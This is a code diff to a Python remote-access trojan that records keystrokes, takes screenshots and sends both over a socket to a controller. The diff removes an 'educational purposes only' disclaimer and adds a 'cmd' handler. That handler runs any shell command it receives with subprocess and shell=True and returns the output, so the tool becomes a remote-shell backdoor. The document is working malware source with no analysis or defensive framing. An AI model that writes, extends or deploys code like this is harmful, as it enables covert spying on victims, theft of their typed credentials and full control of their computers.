@@ -1,11 +1,8 @@
-'''
-Disclaimer: This code and software are provided for educational purposes only. The author and contributors disclaim any responsibility for misuse, harm, or damage caused by the use of this code. Use at your own risk and responsibility. This code should not be used for any malicious or unauthorized activities.
-'''
-
 from PIL import ImageGrab
 import socket
 import os
 import threading
+import subprocess
 from pynput import keyboard
 
 def take_screenshot():
@@ -66,7 +63,13 @@ def main():
                     client_socket.sendall(screenshot_data)
                 print("Screenshot data sent successfully.")
                 os.remove("screenshot.png")  # Delete the screenshot after sending
-
+            elif command == "cmd":
+                cmd_command = client_socket.recv(1024).decode().strip()
+                try:
+                    output = subprocess.check_output(cmd_command, shell=True).decode('utf-8')
+                    client_socket.sendall(bytes(output, 'utf-8'))
+                except Exception as e:
+                    client_socket.sendall(bytes(str(e), 'utf-8'))
             elif command == "logs":
                 print("Sending key logs...")
                 with open("keylogs.txt", "rb") as f:
